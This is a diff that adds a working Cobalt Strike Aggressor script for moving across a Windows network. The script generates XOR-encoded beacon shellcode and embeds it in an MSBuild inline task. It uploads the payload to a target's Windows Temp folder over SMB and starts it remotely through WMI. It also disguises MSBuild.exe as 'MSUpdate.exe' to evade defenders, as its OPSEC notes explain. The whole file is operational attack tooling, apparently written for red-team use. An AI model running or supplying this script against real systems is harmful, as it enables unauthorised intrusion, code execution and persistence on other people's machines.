@@ -1,0 +1,324 @@
+######################################
+## MsBuild via Cobalt Strike 		##
+######################################
+## Adapted by @andrewchiles for CS 4.0 jump and removed PowerLessShell requirement
+## Original Authors: 		Alyssa (ramen0x3f), MrT__F version for PowerLessShell
+
+
+#### Set Up ####
+# i. copy ./wmi_msbuild/ to your Cobalt Strike installation (don't change the directory name)
+# ii. Load wmi_msbuild.cna script into Cobalt Strike via "Cobalt Strike -> Script Manager -> Load"
+
+#### Usage ####
+# jump wmi_msbuild [TARGET] [LISTENER]		Execute msbuild payload via WMI (Powerpick)
+
+# check_msbuild -target TARGET   			Verify .NET 4.0.30319 is installed 
+# rename_msbuild -target TARGET 			Copy MSBuild.exe to a new location  
+#	[-msbuild newname]
+# 	[-path C:\new\path]
+
+#### OPSEC Notes ####
+# Spawns powershell.exe on source system to execute WMI
+# Spawns msbuild.exe on target system by default
+# Writes a temporary file on target system at C:\Windows\Temp\<random>.TMP via SMB (You will need access to TCP\445)
+# Change the XML template in the associate python script if you want to mix up the shellcode execution technique (e.g., use remote process injection)
+
+# To-Do: Modify the jump command to accept arbitrary msbuild paths 
+
+#### Globals
+global('$remote_working_dir $msbuild_name $date $temp_filename_shellcode $temp_filename_xml');
+
+$remote_working_dir = "C$\\Windows\\Temp\\";
+$msbuild_name = "MSUpdate.exe";
+$date = formatDate("yyyyMMdd_HHmmss");
+$temp_filename_shellcode = $date . "_payload.raw";
+$temp_filename_xml = $date . "_payload.xml";
+
+#### Register command aliases ####
+beacon_command_register("check_msbuild", 
+		"Look for .NET v4.0.30319 on target",
+		"Synopsis: check_msbuild -target TARGET", 
+		"This checks a remote system for .NET v4.0.30319");
+
+beacon_command_register("rename_msbuild", 
+		"Create innocent looking copy of MSBuild.exe",
+		"Synopsis: rename_msbuild -target TARGET [-msbuild newname] [-path C:\\new\\path\\]", 
+		"This copies MSBuild.exe to C:\\Windows\\Temp\MSUpdate.exe by default.");
+
+sub parse_args {
+	# Directly pulled from PowerLessShell project's .cna
+	# Description #
+	###############
+	## Add arguments and switches to your function 
+	## instead of everything being positional and sketchy.
+	#  Arguments  #
+	###############
+	## 1	Array of arguments from your initial function
+	
+	local('%args $get_val @to_check $bid');
+
+	if ( @_[0][0] in beacon_ids() ) {
+		$bid = @_[0][0];
+		@to_check = sublist(@_[0], 1); #Excludes the $bid
+	}
+	else {
+		@to_check = @_[0];
+	}
+	
+	foreach $a (@to_check) {
+		if( (charAt($a,0) cmp "-") == 0 ) { #Create keys for args
+			$get_val = substr($a, 1);
+			%args[$get_val] = true; #Treat like a switch by default
+		}
+		else if( $get_val ) { #Save value of key
+			%args[$get_val] = $a;
+			$get_val = $null;
+		}
+		else if ( $bid ) {  #Print to beacon if command was run from beacon
+			berror($1, "Something went wrong processing: " . $a);
+		}
+		else { #Print to script console if command was run from script console
+			println("Something went wrong processing: " . $a);
+		}
+	}
+
+	return %args;
+}
+
+sub gen_payload_raw {
+	# Generates a raw 64bit shellcode for the msbuild XML template
+	local('$shellcode $handle');
+	$shellcode = artifact_payload($1, "raw", "x64");
+	$handle = openf(">wmi_msbuild/$temp_filename_shellcode");
+	writeb($handle, $shellcode);
+	closef($handle);
+	if (checkError($error)) 
+	{
+		berror($1,"Could not open the file: $error");
+		break;
+	}
+}
+
+sub gen_random {
+	# returns a random string
+	local('@alphabet $len $i $random');
+	@alphabet = @("0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z");
+	
+	#Random string length between 5 and 10
+	$len = rand(5) + 5;	
+	for($i = 0; $i < $len; $i++){
+		$random .= rand(@alphabet);	
+	}
+	return $random;
+}
+
+sub gen_payload_msbuild {
+	# Uses msbuild_inline_xor.py to generate a basic msbuild XML C# shellcode runner payload with XOR'd shellcode
+	local('$handle $command $key');
+
+	# Enure the msbuild payload generator exists
+	$handle = openf("wmi_msbuild/msbuild_inline_xor.py");
+	# Break on error
+	if (checkError($error)) {
+		warn($error);
+		berror($1, $error);
+		break;
+	}
+	closef($handle);
+
+	$key = gen_random();
+	# Build the powershell generator command
+	$command = "python msbuild_inline_xor.py --in $temp_filename_shellcode --out $temp_filename_xml --str_key $key";
+	$handle	= exec($command, $null, "./wmi_msbuild");
+	# Break on error
+	if (checkError($error)) 
+	{
+		berror($1, "Error generating msbuild template: $error");
+		break;
+	}
+	# Wait for payload generation to finish
+	wait($handle);
+	closef($handle);
+}
+
+sub rename_msbuild {
+	# Arguments #
+	#############
+	## $2 	target
+	## $3	name to copy MSBuild.exe to
+	## $4	new working directory
+	local ('$original_msbuild_path $new_msbuild_path');
+
+	$original_msbuild_path = '\\\\' . $2 . '\\C$\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe';
+	$new_msbuild_path = '\\\\' . $2 . '\\' . strrep($4, ":", "$") . $3;
+
+	bcp($1, $original_msbuild_path, $new_msbuild_path);	
+}
+
+sub jump_wmi_msbuild {
+	# Arguments #
+	#############
+	## bid 		-   required
+	## target 	- 	required
+	## listener - 	required
+	#### need to fix support for these
+	## msbuild 	- 	optional, location of alternate msbuild
+	## payload 	- 	optional, new filename for payload
+	## manualdelete -	optional, switch, doesn't use cmd/auto delete payload
+
+	local('$msbuild $handle $payload $psh_command $command $payload_dir');
+	
+	###############
+	# MSBuild.exe #
+	###############
+   	#if ( 'msbuild' in %args ) {
+   	#	$msbuild =  %args['msbuild'];
+   	#}
+   	#else {
+   		$msbuild = 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe';
+   	#}
+
+   	blog($1, "Using MSBuild.exe in: " . $msbuild);
+
+	###########
+	# Payload #
+	###########
+	#Write payload to disk
+	#i re-do this every time in case the listener changes. Probably could be more efficient
+	gen_payload_raw($3);
+	
+	# Generate the msbuild XML file 
+	gen_payload_msbuild($1);
+	
+	$handle = openf("wmi_msbuild/$temp_filename_xml");	
+	if (checkError($error)) {
+		warn($error);
+		berror($1, $error);
+		break;
+	}
+	
+	$msbuild_payload = readb($handle, -1);
+
+	closef($handle);	
+	
+	#generate random payload name if not specified
+	#if ( 'payload' in %args ) {
+	#	$filename = %args['payload'];
+	#}
+	#else {
+		$msbuild_payload_filename = gen_random();
+		$msbuild_payload_filename .= ".TMP";
+	#}
+
+	#use new directory if specified
+	#if ( 'directory' in %args ) {
+	#	$pay_dir = %args['directory'];
+	#	if ( (charAt($pay_dir, -1) cmp "\\") != 0) {
+	#		$pay_dir = $pay_dir . "\\";
+	#	}
+	#}
+	#else {
+		$payload_dir = $remote_working_dir;
+	#}
+
+	blog($1, "Starting jump via WMI and MSBuild!");
+	btask($1, "Tasked Beacon to spawn to " . $2 . " (" . listener_describe($3, $2) . ") via wmi_msbuild");
+	
+	# Upload the msbuild XML payload
+	$remote_payload_path = '\\\\'. $2 . '\\' . strrep($payload_dir, ":", "$");
+	
+	bupload_raw($1, $remote_payload_path . $msbuild_payload_filename , $msbuild_payload);
+
+	##########
+	# Launch #
+	##########
+	$command = $msbuild . ' ' . strrep($payload_dir, "$", ":") . $msbuild_payload_filename . ' /noconsolelogger';
+	## Do all through remote-exec WMI (this method uses powershell.exe)
+	#bremote_exec($1, "wmi", $2, $command);
+	
+	# Execute msbuild via powerpick (make it silent with ! after bpowerpick, but you will lose errors from the WMI execution
+	$psh_command = "Invoke-WmiMethod -Computername $2 -Name Create -Class Win32_PROCESS \"$command\"";
+	bpowerpick($1,$psh_command);
+	
+	## Link to TCP\SMB Beacons
+	beacon_link($1, $2, $3);
+	
+	# Sleep client for a few seconds before attempting to remove local files
+	## Remove Local Temporary Files
+	$handle	= exec("rm $temp_filename_xml", $null, "./wmi_msbuild");
+	wait($handle);
+	closef($handle);
+	$handle	= exec("rm $temp_filename_shellcode", $null, "./wmi_msbuild");
+	wait($handle);
+	closef($handle);
+
+	## Cleanup
+	blog($1,"Don't forget to manually remove the temporary msbuild XML file: $remote_payload_path$msbuild_payload_filename");
+}
+
+###########
+# ALIASES #
+###########
+alias check_msbuild {
+	# Arguments #
+	#############
+	## target 	- 	required
+
+	%args = %();
+	if ( size(@_) == 2 ) {
+		%args['target'] = $2;
+	}
+	else {
+		%args = parse_args(@_);
+		if ( "target" !in %args ) {
+			berror($1, "Missing required arguments. Please review what you provided.")
+			berror($1, "Example: check_msbuild 192.168.0.1");
+			break;
+		}
+	}
+
+	blog($1, "Checking for existence of MSBuild.exe v4.0.30319 on " . %args['target']);
+	bls($1, "\\\\" . %args['target'] . "\\C$\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\")
+}
+
+alias rename_msbuild {
+	# Arguments #
+	#############
+	## $2	target
+	## $3 	(opt) name to copy MSBuild.exe to
+	## $4 	(opt) new directory
+
+	%args = %();
+
+	%args = parse_args(@_);
+	if ( "target" !in %args ) {
+		berror($1, "Missing required arguments. Please review what you provided.");
+		berror($1, "Example: rename_msbuild -target 192.168.0.1 [-msbuild acrord32.exe] [-path C:\\Users\\Public\\Downloads\\]");
+	}
+	else {
+		if ( 'path' !in %args ) {
+			# User didn't specify a path
+			%args['path'] = strrep($remote_working_dir, "$", ":");
+		}
+		if ( 'msbuild' !in %args ) {
+			# User didn't specify a msbuild filename
+			%args['msbuild'] = $msbuild_name;
+		}
+		# Do the remote file renaming via SMB
+		rename_msbuild($1, %args['target'], %args['msbuild'], %args['path']);
+	}
+}
+
+beacon_remote_exploit_register(
+	"wmi_msbuild", 
+	"x64", 
+	"wmi lateral movement with msbuild c# task",
+	&jump_wmi_msbuild);
+
+	# Arguments
+	#$1 - the exploit short name
+	#$2 - the arch associated with this attack (e.g., x86, x64)
+	#$3 - a description of the exploit
+	#$4 - the function that implements the exploit ($1 is the Beacon ID, $2 is the target, $3 is the listener)
+	#See Also
+	#&beacon_remote_exploit_describe, &beacon_remote_exploits, &bjump
